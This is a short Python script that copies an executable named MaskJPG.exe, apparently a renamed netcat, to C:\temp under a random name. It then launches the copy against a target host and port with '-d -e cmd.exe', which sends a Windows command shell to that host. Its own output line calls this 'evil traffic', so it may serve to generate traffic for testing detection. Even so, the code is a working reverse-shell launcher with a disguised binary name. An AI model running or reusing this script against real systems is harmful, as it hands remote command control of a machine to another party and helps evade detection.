from shutil import copyfile
import uuid
import subprocess
import sys

tgt = sys.argv[1]
port = sys.argv[2]

uuid_string = uuid.uuid4().hex[:8].upper()
filename = 'MaskJPG_{}'.format(uuid_string)
program = 'C:\\temp\\{}.exe'.format(filename)
copyfile('C:\\Scripts\\MaskJPG.exe', program)
argument1 = tgt
argument2 = port
argument3 = '-d'
argument4 = '-e'
argument5 = 'cmd.exe'

subprocess.call([program, argument1,argument2,argument3,argument4,argument5])
print('New file created: {}.exe and generated evil traffic on port: {} \nFullpath: {}'.format(filename,port,program))